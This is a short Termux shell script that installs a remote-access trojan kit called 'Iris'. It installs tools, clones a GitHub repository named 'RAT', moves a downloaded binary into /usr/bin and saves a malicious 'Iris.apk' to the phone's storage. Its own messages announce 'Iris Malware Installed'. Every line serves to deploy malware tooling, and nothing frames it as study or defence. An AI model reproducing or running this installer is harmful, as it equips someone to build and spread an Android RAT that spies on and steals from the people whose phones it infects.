termux-setup-storage
pkg install git -y
pkg install wget -y 
pkg install nodejs -y
pkg install proot -y && termux-chroot;

cd $HOME;
git clone https://github.com/IrisYoutuber/RAT.git;
cd RAT && npm install;
mv RAT .rat;
wget https://github.com/IrisYoutuber/RAT/blob/master/app/factory/decompiled/build/apk/install
mv install Iris;
mv Iris /usr/bin/;
wget https://github.com/IrisYoutuber/RAT/blob/master/app/factory/decompiled/build/apk/Iris.apk;
mv Iris.apk /sdcard;
echo "IRIS APK SAVED IN INTERNAL STORAGE"
echo "Iris Malware Installed"
echo "Type (Iris) To Run"
